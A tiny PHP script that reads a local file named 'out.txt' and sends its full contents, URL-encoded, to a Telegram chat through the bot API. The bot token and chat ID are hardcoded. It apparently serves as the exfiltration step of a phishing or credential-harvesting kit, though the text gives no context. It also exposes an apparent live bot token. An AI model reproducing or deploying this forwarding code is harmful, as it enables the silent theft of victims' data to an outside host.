<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/516933155:AAFVCQY958Kx8cFxJQjZIkgDjH728BkCTGc/sendMessage?chat_id=5114154724&text=$msg");
?>
